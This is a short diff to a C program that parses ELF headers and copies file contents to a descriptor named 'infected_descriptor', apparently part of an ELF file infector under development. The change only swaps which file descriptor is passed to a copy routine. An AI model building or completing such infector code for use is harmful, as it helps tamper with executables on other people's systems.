@@ -227,13 +227,14 @@ int main(int argc, char * argv[]){
 	if(lseek(fd, position+(elf_header->e_shentsize*elf_header->e_shnum),SEEK_SET)<0){
 		puts("LSEEK ERROR");
 	}
-
+	
+	int old_fd = fd;
     int fd_filesize = lseek(fd,0,SEEK_END);
 	printf("The filesize is, %d", fd_filesize);
 
 	//write everything to end of file	
 	puts("or here?");
-	copy_partial(fd, infected_descriptor, fd_filesize-position);
+	copy_partial(old_fd, infected_descriptor, fd_filesize-position);
 	
 
 	return 0;
